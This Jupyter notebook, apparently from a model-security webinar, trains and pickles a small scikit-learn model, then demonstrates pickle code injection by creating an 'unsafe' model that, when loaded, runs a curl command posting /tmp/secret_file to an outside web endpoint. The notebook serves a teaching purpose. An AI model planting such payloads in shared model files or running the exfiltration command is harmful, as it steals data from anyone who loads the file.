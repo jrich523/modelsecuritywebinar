{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3bb4d982-f213-45af-a158-97cfabf618b3",
   "metadata": {},
   "source": [
    "# 01 Building A Model\n",
    "\n",
    "All of machine learning rests on models, this notebook builds a simple model with no issues.\n",
    "\n",
    "It also later builds a model with a security vulnerability within it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "d3f76d17-91d6-484d-8512-bca5c1d953b7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "805281d7-67cc-49ed-8a6d-f153b7f80fad",
   "metadata": {},
   "source": [
    "## Generating Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3c0ab85e-2cb9-4dac-b79a-e21fb481ae4b",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.datasets import make_classification\n",
    "from sklearn.model_selection import train_test_split\n",
    "\n",
    "# Generate a binary classification dataset\n",
    "X, y = make_classification(n_samples=1000, n_features=20, n_classes=2, random_state=42)\n",
    "\n",
    "# Split the dataset into training and test sets\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b64c1918-e08a-4857-855f-7cb907b7d14b",
   "metadata": {},
   "source": [
    "## Build and Train a Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e8f0afaf-026e-4dd3-b9fa-31dc5c9acc65",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Accuracy: 85.50%\n"
     ]
    }
   ],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.metrics import accuracy_score\n",
    "\n",
    "# Initialize the Logistic Regression model\n",
    "model = LogisticRegression()\n",
    "\n",
    "# Train the model\n",
    "model.fit(X_train, y_train)\n",
    "\n",
    "# Test the model and print the accuracy\n",
    "y_pred = model.predict(X_test)\n",
    "accuracy = accuracy_score(y_test, y_pred)\n",
    "print(f\"Accuracy: {accuracy * 100:.2f}%\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82f78559-7522-4c3e-9cbd-323863fd3201",
   "metadata": {},
   "source": [
    "## Save the Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "5e3b2609-8671-42f9-a63b-0d98a59f2948",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "\n",
    "# Save the model to a file\n",
    "with open('logistic_model.pkl', 'wb') as model_file:\n",
    "    pickle.dump(model, model_file)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fdabc32f-813d-449b-af5f-5eb49f1a3ff3",
   "metadata": {},
   "source": [
    "## Load and Use the Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "0a57b983-3d50-4aa1-a470-6eda3208f96e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded Model Accuracy: 85.50%\n"
     ]
    }
   ],
   "source": [
    "# Load the model from the file\n",
    "with open('logistic_model.pkl', 'rb') as model_file:\n",
    "    loaded_model = pickle.load(model_file)\n",
    "\n",
    "# Use the loaded model to make predictions\n",
    "loaded_y_pred = loaded_model.predict(X_test)\n",
    "loaded_accuracy = accuracy_score(y_test, loaded_y_pred)\n",
    "print(f\"Loaded Model Accuracy: {loaded_accuracy * 100:.2f}%\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55713ca4-7d6a-4573-9bdf-f62f6c00af54",
   "metadata": {},
   "source": [
    "## Creating an Insecure Model\n",
    "\n",
    "It really is not terribly hard.\n",
    "\n",
    "This example is going to post the contents of `/tmp/secret_file` to a fictional HTTP endpoint."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "93cdc5a0-8549-4459-ac7c-b6b7f6fcb0b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from utils.pickle_codeinjection import generate_unsafe_file"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d204152f-0df9-4b98-80df-172aad4fdbd2",
   "metadata": {},
   "source": [
    "Now what we need to do is create the request for that file to our endpoint."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "0a1afca6-fa62-431b-8b68-551eba69c532",
   "metadata": {},
   "outputs": [],
   "source": [
    "malicious_command = \"curl -X POST -d @/tmp/secret_file http://protectai.com/securitycheck > /dev/null 2>&1\"\n",
    "command = \"system\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "eb7b7774-85cb-479f-bcbd-009397abe485",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('logistic_model.pkl', \"rb\") as fo:\n",
    "    safe_model_pickle = pickle.load(fo)\n",
    "\n",
    "unsafe_model_path = \"unsafe_model.pkl\"\n",
    "generate_unsafe_file(safe_model_pickle, command, malicious_command, unsafe_model_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "694b69e8-d265-4118-bd89-5404ff8bc096",
   "metadata": {},
   "source": [
    "## Using the Insecure Model\n",
    "\n",
    "The code below executes inference with the insecure model.\n",
    "\n",
    "In a new terminal run the following command to see the request being made:\n",
    "\n",
    "```bash\n",
    "sudo tshark -i any -Y 'http.request and http.host contains \"protectai.com\"' -T fields -e http.host -e http.request.uri\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "72d088f6-d0b4-4010-88f1-44bd7ad8e9cf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded Model Accuracy: 85.50%\n"
     ]
    }
   ],
   "source": [
    "# Load the model from the file\n",
    "with open(unsafe_model_path, 'rb') as model_file:\n",
    "    unsafe_model = pickle.load(model_file)\n",
    "\n",
    "# Use the loaded model to make predictions\n",
    "loaded_y_pred = unsafe_model.predict(X_test)\n",
    "loaded_accuracy = accuracy_score(y_test, loaded_y_pred)\n",
    "print(f\"Loaded Model Accuracy: {loaded_accuracy * 100:.2f}%\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e5865a9-f9bb-40df-8c34-681dbcb055e6",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81eadabc-7beb-47f4-83de-a8ae33a9ed36",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
